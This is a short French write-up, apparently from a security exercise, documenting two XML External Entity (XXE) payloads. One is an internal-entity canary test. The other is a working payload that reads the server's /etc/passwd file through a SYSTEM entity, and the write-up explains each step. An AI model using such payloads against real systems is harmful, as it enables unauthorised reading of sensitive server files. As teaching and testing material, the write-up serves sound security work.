-----

# Documentation des Payloads pour la Vulnérabilité XXE

Ce document détaille les différentes charges utiles (payloads) utilisées pour identifier et exploiter la vulnérabilité de type **XML External Entity (XXE)** sur l'application. La démarche a suivi une progression logique, allant d'une simple vérification à une exfiltration de données critiques.

-----

## 1\. Payload de Vérification ("Canari")

Ce premier payload a pour objectif de confirmer de manière non destructive si le parseur XML de l'application interprète les entités définies dans une DTD ("Document Type Definition") fournie par l'utilisateur.

### Objectif

Vérifier que le traitement des entités XML est actif.

### Code du Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY canary "SUCCESS" > ]>
<data>&canary;</data>
```

### Explication

  * `<!ENTITY canary "SUCCESS">` : Cette ligne déclare une **entité interne** nommée `canary` et lui assigne la chaîne de caractères "SUCCESS".
  * `&canary;` : Cet appel dans le corps du document XML demande au parseur de remplacer l'appel par la valeur de l'entité.
  * **Résultat** : L'application a renvoyé `<data>SUCCESS</data>`, confirmant que le parseur est mal configuré et interprète les entités fournie par un utilisateurs, ouvrant la voie à une exploitation plus poussée.

-----

## 2\. Payload d'Exfiltration de Fichier Local

Une fois la vulnérabilité confirmée, ce payload a été utilisé pour atteindre l'objectif principal de l'exercice : lire un fichier sensible sur le système de fichiers du serveur.

### Objectif

Lire le contenu du fichier `/etc/passwd` et l'afficher dans la réponse de l'application.

### Code du Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<data>&xxe;</data>
```

### Explication

  * `<!ENTITY xxe SYSTEM "file:///etc/passwd">` : Le mécanisme est le même que précédemment, mais avec deux différences critiques :
    1.  Le mot-clé **`SYSTEM`** indique au parseur que la ressource est **externe**.
    2.  L'URI **`file:///etc/passwd`** lui ordonne de lire un fichier local sur le serveur.
  * **Résultat** : Le contenu intégral du fichier `/etc/passwd` a été injecté dans la réponse et affiché à l'écran, démontrant une exfiltration de données réussie.
